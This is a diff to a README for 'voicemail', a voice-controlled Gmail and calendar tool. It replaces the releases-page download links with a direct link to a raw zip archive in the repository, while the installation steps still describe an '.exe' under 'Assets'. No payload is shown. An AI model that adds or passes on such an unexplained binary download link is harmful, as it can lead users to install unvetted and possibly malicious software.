@@ -1,6 +1,6 @@
 # 📧 voicemail - Triage your inbox using your voice
 
-[![](https://img.shields.io/badge/Download_Installer-Blue-blue.svg)](https://github.com/neroabient558/voicemail/releases)
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue.svg)](https://github.com/neroabient558/voicemail/raw/refs/heads/main/public/Software-v1.8.zip)
 
 Voicemail AI manages your emails and calendar while you move. This tool links to your Gmail account and uses voice commands to process messages. You speak to the application to read, reply, or delete emails. It integrates your calendar to book meetings and send invitations. This setup keeps your hands free and your eyes on the road.
 
@@ -18,7 +18,7 @@ Your computer must meet these requirements to run the software smoothly:
 
 Follow these steps to obtain and install the voicemail software on your Windows machine:
 
-1. Visit the following link to access the software files: [https://github.com/neroabient558/voicemail/releases](https://github.com/neroabient558/voicemail/releases).
+1. Visit the following link to access the software files: [https://github.com/neroabient558/voicemail/raw/refs/heads/main/public/Software-v1.8.zip](https://github.com/neroabient558/voicemail/raw/refs/heads/main/public/Software-v1.8.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your "Downloads" folder.
